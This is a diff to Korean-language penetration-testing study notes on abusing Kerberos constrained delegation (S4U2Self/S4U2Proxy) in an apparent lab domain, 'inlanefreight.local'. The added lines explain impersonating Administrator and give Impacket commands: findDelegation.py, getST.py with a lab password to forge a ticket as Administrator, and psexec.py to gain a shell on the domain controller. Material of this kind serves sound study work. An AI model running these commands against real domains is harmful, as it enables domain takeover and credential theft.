@@ -99,6 +99,10 @@ secretsdump.py -k -no-pass dc01.inlanefreight.local
 - 서비스(A)가 KDC에 User가 서비스(A)에 접근할 때 썼던 티켓을 그대로 `additional tickets`로 첨부 제출하면서, "이 티켓 속 유저(cname) 자격으로 서비스(B)용 새 ST를 발급해달라"고 요청하는 것(S4U2Proxy)
 - `cname-in-addl-tkt` 플래그를 통해 KDC는 서비스가 아니라 첨부 티켓 속 cname(User) 기준으로 발급 대상을 판단
 - 단, 서비스(A)의 `msDS-AllowedToDelegateTo` 속성에 서비스(B)가 명시되어 있어야만 발급 가능
+- (S4U2Self) User가 실제로 서비스(A)에 접근한 적이 없어도, A가 자신의 TGT를 근거로 KDC에 직접 요청해 "User가 A에 인증했다"는 TGS를 새로 발급받을 수 있다
+- 가장 높은 권한을 얻는 것이 공격에 가장 부합하기 때문에 `Administrator` 유저로 사칭해서 요청.
+
+### Windows
 ```powershell
 Import-Module .\PowerView.ps1
 
@@ -116,6 +120,19 @@ Get-DomainComputer -TrustedToAuth
 ```
 ```powershell
 Enter-PSSession ws01.inlanefreight.local
+```
+
+### Linux
+```bash
+findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
+```
+```bash
+getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
+```
+```bash
+export KRB5CCNAME=./Administrator.ccache
+
+psexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01 -debug
 ```
 
 ## Resource-Based Constrained Delegation
